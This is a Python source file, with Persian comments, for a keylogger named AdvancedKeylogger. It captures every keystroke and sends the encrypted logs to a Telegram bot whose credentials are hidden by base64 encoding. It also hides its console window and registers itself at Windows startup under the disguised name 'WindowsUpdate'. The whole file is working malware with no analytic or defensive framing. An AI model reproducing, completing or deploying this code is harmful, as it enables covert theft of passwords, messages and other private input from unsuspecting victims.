import logging
from pynput import keyboard
from telegram import Bot
from telegram.error import TelegramError
import os
import sys
import time
import base64
import zlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import winreg

TELEGRAM_TOKEN = base64.b64decode('ODI0Mzc5MzM5ODpBQUV1MWZwVVJHUmxNMUVnZTBCZHlUSU1WQkZ1Y1dLQWpPQQ==').decode('utf-8')
TELEGRAM_CHAT_ID = base64.b64decode('NTQ2NDM1Nzc0Mg==').decode('utf-8')


KEY = get_random_bytes(16)  # کلید AES 128 بیتی
IV = get_random_bytes(16)   # بردار اولیه

class AdvancedKeylogger:
    def __init__(self):
        self.bot = Bot(token=TELEGRAM_TOKEN)
        self.buffer = []
        self.last_send_time = time.time()


    def encrypt_data(self, data):
        """رمزنگاری دادهها با AES."""
        cipher = AES.new(KEY, AES.MODE_CFB, IV)
        encrypted_data = cipher.encrypt(zlib.compress(data.encode('utf-8')))
        return base64.b64encode(encrypted_data).decode('utf-8')

    def send_to_telegram(self, data):
        """ارسال دادههای رمزنگاری شده به تلگرام."""
        try:
            encrypted_data = self.encrypt_data(data)
            self.bot.send_message(
                chat_id=TELEGRAM_CHAT_ID,
                text=f"Keylog (Encrypted):\n{encrypted_data}"
            )
        except TelegramError as e:
            logging.error(f"Telegram error: {e}")
        except Exception as e:
            logging.error(f"Error sending data: {e}")

    def on_press(self, key):
        """ثبت ضربات کلید و ارسال لحظهای."""
        try:
            key_str = str(key).replace("'", "")
            self.buffer.append(key_str)
            
            # ارسال دادهها هر 10 ثانیه یا وقتی بافر پر شد
            if (time.time() - self.last_send_time > 10) or (len(self.buffer) >= 100):
                self.send_to_telegram(' '.join(self.buffer))
                self.buffer = []
                self.last_send_time = time.time()
        except Exception as e:
            logging.error(f"Error in key press: {e}")

    def add_to_startup(self):
        """اضافه شدن به استارتآپ ویندوز با استفاده از رجیستری."""
        try:
            script_path = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
        except Exception as e:
            logging.error(f"Error adding to startup: {e}")

if name == "main":
    # پنهانسازی کنسول
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


    # اجرای کیلاگر
    keylogger = AdvancedKeylogger()
    keylogger.add_to_startup()

    with keyboard.Listener(on_press=keylogger.on_press) as listener:
        listener.join()